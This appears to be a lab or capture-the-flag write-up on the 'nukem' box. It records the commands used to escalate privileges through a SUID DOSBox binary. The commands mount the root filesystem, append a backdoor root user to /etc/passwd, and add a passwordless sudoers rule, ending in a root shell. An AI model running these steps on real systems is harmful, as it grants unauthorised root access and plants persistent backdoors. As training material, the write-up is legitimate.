# 5 privesc dosbox

```
[commander@nukem ~]$ /usr/bin/dosbox -version
DOSBox version 0.74-3, copyright 2002-2019 DOSBox Team.

Using https://linux.die.net/man/1/dosbox
# dosbox opens an emulator command prompt on UI.

# as VNC is running on localhost 5901
# time to port forward so we can connnect to vnc via localhost

$ ssh -L 5901:localhost:5901 commander@192.168.125.105

# running /usr/bin/dosbox
# opens a dosbox cmd prompt
# looks like windows

Using https://linux.die.net/man/1/dosbox
# searching for suid /usr/bin/dosbox > https://github.com/liwuqi/huck-box/blob/master/my_notes
# we can mount file system using MOUNT <drive> <path>

Z:\> MOUNT k /
Mounting / is NOT recommended. Please mount a (sub)directory next time.
Drive k is mounted as local directory /.

Z:\> k:
# we are now under / filesystem

# can read /root/proof.txt flag but we need interactive shell
# changing /etc/passwd

K:\> echo 'kashz:cAZZtf3ncxRAY:0:0:root:/root:/bin/bash' >> /etc/passwd
[commander@nukem ~]$ su kashz
Password:
Warning: your password will expire in 32558 days.
: No such file or directorybash

# not working
# lets add commander to sudoers
K:\> echo commander ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers

# via ssh shell
[commander@nukem ~]$ sudo su
[root@nukem commander]# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
nukem
```
